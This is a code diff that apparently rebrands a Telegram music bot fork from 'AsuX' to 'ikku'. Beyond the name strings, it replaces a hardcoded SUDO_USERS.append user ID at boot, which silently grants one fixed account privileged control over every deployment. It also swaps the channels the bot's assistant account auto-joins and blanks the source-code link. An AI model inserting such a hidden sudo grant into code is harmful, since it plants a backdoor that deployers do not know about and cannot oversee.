@@ -24,7 +24,7 @@ HELPABLE = {}
 
 async def AsuX_boot():
     with console.status(
-        "[magenta] ʙᴏᴏᴛɪɴɢ AsuX ᴍᴜsɪᴄ...",
+        "[magenta] ʙᴏᴏᴛɪɴɢ ιккυ ᴍᴜsɪᴄ...",
     ) as status:
         console.print("┌ [red]ᴄʟᴇᴀʀɪɴɢ ᴍᴏɴɢᴏᴅʙ ᴄᴀᴄʜᴇ...")
         try:
@@ -73,7 +73,7 @@ async def AsuX_boot():
             status="[bold blue]ᴍᴏᴅᴜʟᴇs ɪᴍᴘᴏʀᴛᴀᴛɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!",
         )
         await asyncio.sleep(0.2)
-        SUDO_USERS.append(1452219013)
+        SUDO_USERS.append(1890206319)
         await startup_del(_____)
     console.print(
         "[bold green]ᴛʀʏɪɴɢ ᴛᴏ sᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ...\n"
@@ -81,7 +81,7 @@ async def AsuX_boot():
     try:
         await app.send_message(
             config.LOGGER_ID,
-            f"<b>➻ ᴀsᴜ ✘ ᴍᴜsɪᴄ ʙᴏᴛ 🔮\n\n❄ ɪᴅ :</b> `{BOT_ID}`\n✨ <b>ɴᴀᴍᴇ :</b> {BOT_NAME}\n☁ <b>ᴜsᴇʀɴᴀᴍᴇ :</b> @{BOT_USERNAME}",
+            f"<b>➻ ιккυ ✘ ᴍᴜsɪᴄ ʙᴏᴛ 🔮\n\n❄ ɪᴅ :</b> `{BOT_ID}`\n✨ <b>ɴᴀᴍᴇ :</b> {BOT_NAME}\n☁ <b>ᴜsᴇʀɴᴀᴍᴇ :</b> @{BOT_USERNAME}",
         )
     except Exception as e:
         print(
@@ -106,8 +106,8 @@ async def AsuX_boot():
         console.print(f"\n[red]sᴛᴏᴘᴘɪɴɢ ʙᴏᴛ")
         return
     try:
-        await Ass.join_chat("AbishnoiMF")
-        await Ass.join_chat("Abishnoi_bots")
+        await Ass.join_chat("idekickfriend")
+        await Ass.join_chat("ikku_hoi")
     except:
         pass
     console.print(f"\n┌[red] ʙᴏᴛ sᴛᴀʀᴛᴇᴅ ᴀs {BOT_NAME}!")
@@ -201,7 +201,7 @@ async def start_command(_, message):
             ],
             [
                 InlineKeyboardButton(
-                    text="❄ ʜᴇʟᴩ ❄", callback_data="AsuX_help"
+                    text="❄ ʜᴇʟᴩ ❄", callback_data="sidekickfriend"
                 ),
                 InlineKeyboardButton(
                     text="🥀 ᴏᴡɴᴇʀ 🥀", user_id=F_OWNER
@@ -255,7 +255,7 @@ async def AsuX_home(_, CallbackQuery):
             ],
             [
                 InlineKeyboardButton(
-                    text="☁ sᴏᴜʀᴄᴇ ᴄᴏᴅᴇ ☁", url="https://github.com/TEAM-ABG/AsuXMusic"
+                    text="☁ sᴏᴜʀᴄᴇ ᴄᴏᴅᴇ ☁", url="https://github.com/"
                 )
             ],
         ]
